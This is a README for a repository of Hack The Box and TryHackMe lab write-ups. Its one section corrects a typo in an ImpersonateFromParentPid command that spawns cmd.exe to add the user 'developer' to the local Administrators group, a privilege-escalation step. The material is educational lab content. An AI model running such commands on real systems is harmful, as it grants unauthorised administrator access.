# Writeups

Writeups of HTB and THM rooms.

![htb](https://github.com/fromastr/Writeups/assets/36005077/f2bd365a-9bec-4dda-a21e-36cd9ef8da26)![tryhackme](https://github.com/fromastr/Writeups/assets/36005077/e4a78b8a-c469-401e-8dcf-3f452145e5d9)

## Common Command Mistakes

### ImpersonateFromParentPid - net localgroup Typo

**Incorrect command:**
```
ImpersonateFromParentPid -ppid 2416 -command 'c:\windows\system32\cmd.exe' -cmdargs '/c net localgroups Administrator developer /add'
```

**The issue:** The command uses `net localgroups` (with 's') which is incorrect.

**Correct command:**
```
ImpersonateFromParentPid -ppid 2416 -command 'c:\windows\system32\cmd.exe' -cmdargs '/c net localgroup Administrator developer /add'
```

**Explanation:** The Windows command to add a user to a local group is `net localgroup` (without the 's'), not `net localgroups`. Using `localgroups` will result in the command failing with an error.



